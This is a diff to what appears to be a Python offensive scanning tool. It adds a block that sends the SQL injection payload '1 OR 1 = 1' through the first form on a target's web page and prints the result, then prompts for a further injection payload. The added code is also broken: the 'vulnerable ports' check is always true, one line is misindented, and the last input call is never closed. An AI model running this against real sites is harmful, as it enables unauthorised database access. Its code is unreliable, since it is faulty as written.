@@ -1,4 +1,5 @@
 #!/usr/bin/python3
+import mechanize
 import socket
 import os
 import optparse
@@ -82,12 +83,27 @@ def main():
             save = open("scan.txt","r")
             vp = ['ftp','ssh','telnet','netbios-ssn','dns','pop3','windows-rpc','mysql','http','https','smtp','msrpc']
             if vp[0] or vp[1] or vp[2] or vp[3] or vp[4] or vp[5] or vp[6] or vp[7] or vp[8] or vp[9] or vp[10] or vp[11] in save:
-             first_slow_print(wi + gr + "[+]" + wi + "Vulnerable Ports are present!")
+             first_slow_print(wi + gr + "[+]" + wi + "Vulnerable Port(s) found!")
             else: 
              first_slow_print(wi + rd + "[-]" + wi + "No Vulnerable Ports are present!")
            else: 
             first_slow_print(wi + rd + "[-]" + wi + "File scan.txt Not Found Error")
            #sub.call(['nc ','-l',ip,port])
+           try:
+            first_slow_print(wi + yl + '[!]' + wi  + 'Testing Blind Sql Injection on the target')
+            url = "http://" + ip
+            mech = mechanize.Browser()
+            mech.open(url)
+            mech.select_form(nr = 0)
+            mech["id"] = "1 OR 1 = 1"
+            response = mech.submit()
+            content = mech.read()
+            print(content)
+           except  mechanize._response.httperror_seek_wrapper:
+           print(wi + rd + '[-]' + wi + "Error, most likely the target is not vulnerable")
+           first_slow_print(wi + yl + '[!]' + wi + 'Trying a Blind Sql Injection.')
+           requestUrl = ip
+           sqlWord = input(wi + yl + '[!]' + wi + "SQLi_Payload location: "
        else:
           print(wi +  rd + '[-]' + wi + "Host is down or blocking the tool's probes")
     except TypeError:
@@ -99,3 +115,4 @@ def main():
     #
 
 main()
+          
